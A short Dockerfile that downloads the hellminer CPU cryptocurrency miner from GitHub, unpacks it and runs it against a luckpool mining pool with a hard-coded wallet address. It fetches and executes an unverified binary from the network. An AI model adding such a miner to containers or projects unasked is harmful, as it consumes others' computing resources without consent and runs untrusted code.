FROM debian:stable
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
RUN gunzip hellminer_cpu_linux.tar.gz
RUN tar -xvf hellminer_cpu_linux.tar
RUN ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RNmyQmnESm6LhWqWFd5VibTW47FCHTiJyF.bangcemet



